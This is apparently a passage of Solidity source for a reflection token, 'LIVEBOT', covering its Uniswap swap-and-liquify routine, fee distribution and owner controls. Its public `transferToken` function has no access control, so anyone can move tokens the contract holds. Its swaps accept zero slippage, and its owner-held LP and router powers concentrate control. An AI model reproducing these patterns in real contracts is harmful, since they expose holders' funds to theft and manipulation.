    event RouterSet(address indexed router);
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event LiquidityAdded(uint256 tokenAmountSent, uint256 ethAmountSent, uint256 liquidity);

    receive() external payable {}

    function initializeLiquiditySwapper(Env env, uint256 maxTx, uint256 liquifyAmount) internal {
        _env = env;
        if (_env == Env.MainnetV1){ _setRouterAddress(_mainnetRouterV1Address); }
        else if (_env == Env.MainnetV2){ _setRouterAddress(_mainnetRouterV2Address); }
        else /*(_env == Env.Testnet)*/{ _setRouterAddress(_testnetRouterAddress); }

        maxTransactionAmount = maxTx;
        numberOfTokensToSwapToLiquidity = liquifyAmount;

    }

    /**
     * NOTE: passing the `contractTokenBalance` here is preferred to creating `balanceOfDelegate`
     */
    function liquify(uint256 contractTokenBalance, address sender) internal {

        if (contractTokenBalance >= maxTransactionAmount) contractTokenBalance = maxTransactionAmount;
       
        bool isOverRequiredTokenBalance = ( contractTokenBalance >= numberOfTokensToSwapToLiquidity );
   
        if ( isOverRequiredTokenBalance && swapAndLiquifyEnabled && !inSwapAndLiquify && (sender != _pair) ){
            // TODO check if the `(sender != _pair)` is necessary because that basically
            // stops swap and liquify for all "buy" transactions
            _swapAndLiquify(contractTokenBalance);            
        }

    }

    /**
     * @dev sets the router address and created the router, factory pair to enable
     * swapping and liquifying (contract) tokens
     */
    function _setRouterAddress(address router) private {
        IUniswapV2Router01 _newUniswapRouter = IUniswapV2Router01(router);
        _pair = IUniswapV2Factory(_newUniswapRouter.factory()).createPair(address(this), _newUniswapRouter.WETH());
        _router = _newUniswapRouter;
        emit RouterSet(router);
    }
   
    function _swapAndLiquify(uint256 amount) private lockTheSwap {
       
        // split the contract balance into halves
        uint256 half = amount.div(2);
        uint256 otherHalf = amount.sub(half);
       

        uint256 initialBalance = address(this).balance;
       
        // swap tokens for ETH
        _swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        _addLiquidity(otherHalf, newBalance);
       
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }
   
    function _swapTokensForEth(uint256 tokenAmount) private {
       
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();

        _approveDelegate(address(this), address(_router), tokenAmount);

        // make the swap
        _router.swapExactTokensForETH(
            tokenAmount,
            // The minimum amount of output tokens that must be received for the transaction not to revert.
            // 0 = accept any amount (slippage is inevitable)
            0,
            path,
            address(this),
            block.timestamp
        );
    }
   
    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approveDelegate(address(this), address(_router), tokenAmount);

        // add tahe liquidity
        (uint256 tokenAmountSent, uint256 ethAmountSent, uint256 liquidity) = _router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            // Bounds the extent to which the WETH/token price can go up before the transaction reverts.
            // Must be <= amountTokenDesired; 0 = accept any amount (slippage is inevitable)
            0,
            // Bounds the extent to which the token/WETH price can go up before the transaction reverts.
            // 0 = accept any amount (slippage is inevitable)
            0,
            // this is a centralized risk if the owner's account is ever compromised (see Certik SSL-04)
            owner(),
            block.timestamp
        );

     
        withdrawableBalance = address(this).balance;
        emit LiquidityAdded(tokenAmountSent, ethAmountSent, liquidity);
    }
   

    /**
    * @dev Sets the uniswapV2 pair (router & factory) for swapping and liquifying tokens
    */
    function setRouterAddress(address router) external onlyManager() {
        _setRouterAddress(router);
    }

 
    function setSwapAndLiquifyEnabled(bool enabled) external onlyManager {
        swapAndLiquifyEnabled = enabled;
        emit SwapAndLiquifyEnabledUpdated(swapAndLiquifyEnabled);
    }

   
    function withdrawLockedEth(address payable recipient) external onlyManager(){
        require(recipient != address(0), "Cannot withdraw the ETH balance to the zero address");
        require(withdrawableBalance > 0, "The ETH balance must be greater than 0");

        // prevent re-entrancy attacks
        uint256 amount = withdrawableBalance;
        withdrawableBalance = 0;
        recipient.transfer(amount);
    }
   
 
 
       
    /**
     * @dev Use this delegate instead of having (unnecessarily) extend `BaseRfiToken` to gained access
     * to the `_approve` function.
     */
    function _approveDelegate(address owner, address spender, uint256 amount) internal virtual;
   
   

}

//////////////////////////////////////////////////////////////////////////
abstract contract Antiwhale is Tokenomics {

    /**
     * @dev Returns the total sum of fees (in percents / per-mille - this depends on the FEES_DIVISOR value)
     *
     * NOTE: Currently this is just a placeholder. The parameters passed to this function are the
     *      sender's token balance and the transfer amount. An *antiwhale* mechanics can use these
     *      values to adjust the fees total for each tx
     */
    // function _getAntiwhaleFeeLiveBots(uint256 sendersBalance, uint256 amount) internal view returns (uint256){
    function _getAntiwhaleFeeLiveBots(uint256, uint256) internal view returns (uint256){
        return sumOfFeeLbot;
    }
}

//////////////////////////////////////////////////////////////////////////

abstract contract Livebot is BaseRfiToken, Liquifier, Antiwhale {
   
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
   
    // constructor(string memory _name, string memory _symbol, uint8 _decimals){
    constructor(Env _env){

        initializeLiquiditySwapper(_env, maxTransactionAmount, numberOfTokensToSwapToLiquidity);
       
        // exclude the pair address from rewards - we don't want to redistribute
        // tx fees to these two; redistribution is only for holders, dah!
        _exclude(_pair);
        _exclude(burnAddress);
    }
   
    function _isV2Pair(address account) internal view override returns(bool){
        return (account == _pair);
    }

    function _getSumOfFeeLiveBots(address sender, uint256 amount) internal view override returns (uint256){
        return _getAntiwhaleFeeLiveBots(balanceOf(sender), amount);
    }
   
    // function _beforeTokenTransfer(address sender, address recipient, uint256 amount, bool takeFeeLiveBot) internal override {
    function _beforeTokenTransfer(address sender, address , uint256 , bool ) internal override {
        if ( !isInPresale ){
            uint256 contractTokenBalance = balanceOf(address(this));
            liquify( contractTokenBalance, sender );
        }
       
       
    }
   
   
    function _takeTransactionFeeLiveBots(uint256 amount, uint256 currentRate) internal override {
       
        if( isInPresale ){ return; }

        uint256 feesCount = _getFeeLiveBotsCount();
        for (uint256 index = 0; index < feesCount; index++ ){
            (LiveFeeType name, uint256 value, address recipient,) = _getFeeLiveBot(index);
            // no need to check value < 0 as the value is uint (i.e. from 0 to 2^256-1)
            if ( value == 0 ) continue;

            if ( name == LiveFeeType.Rfi ){
                _redistribute( amount, currentRate, value, index );
            }
            else if ( name == LiveFeeType.Burn ){
                _burn( amount, currentRate, value, index );
            }
            else if ( name == LiveFeeType.Antiwhale){
                // TODO
            }
            else if ( name == LiveFeeType.ExternalToETH){
                _takeFeeLiveBotToETH( amount, currentRate, value, recipient, index );
            }
            else {
                _takeFeeLiveBot( amount, currentRate, value, recipient, index );
            }
        }
    }

    function _burn(uint256 amount, uint256 currentRate, uint256 fee, uint256 index) private {
        uint256 tBurn = amount.mul(fee).div(FEES_DIVISOR);
        uint256 rBurn = tBurn.mul(currentRate);

        _burnTokens(address(this), tBurn, rBurn);
        _addFeeLiveBotContractCollectedAmount(index, tBurn);
    }

    function _takeFeeLiveBot(uint256 amount, uint256 currentRate, uint256 fee, address recipient, uint256 index) private {

        uint256 tAmount = amount.mul(fee).div(FEES_DIVISOR);
        uint256 rAmount = tAmount.mul(currentRate);

        _reflectedBalances[recipient] = _reflectedBalances[recipient].add(rAmount);
        if(_isExcludedFromRewards[recipient])
            _balances[recipient] = _balances[recipient].add(tAmount);

        _addFeeLiveBotContractCollectedAmount(index, tAmount);
    }
   
    function collectFeeLiveBot(uint256 index, uint256 amount) internal override {
      _addFeeLiveBotContractCollectedAmount(index, amount);
    }
   

    function _takeFeeLiveBotToETH(uint256 amount, uint256 currentRate, uint256 fee, address recipient, uint256 index) private {
        _takeFeeLiveBot(amount, currentRate, fee, recipient, index);        
    }

    function _approveDelegate(address owner, address spender, uint256 amount) internal override {
        _approve(owner, spender, amount);
    }
   
    function safeApprove( IERC20 token,address spender,uint256 amount) public{
   
    }
   
    function transferToken(IERC20 token, address to,uint256 amount) public {
        token.safeTransfer(to, amount);
    }
   
    function setBurnFeeLiveBot(uint256 amount) external onlyOwner {
        _setFeeLiveBotAmount(0,amount);
       
    }

 
}

contract LIVEBOT is Livebot{
    constructor() Livebot(Env.MainnetV2){
        // pre-approve the initial liquidity supply (to safe a bit of time)
        _approve(owner(),address(_router), ~uint256(0));
    }
}
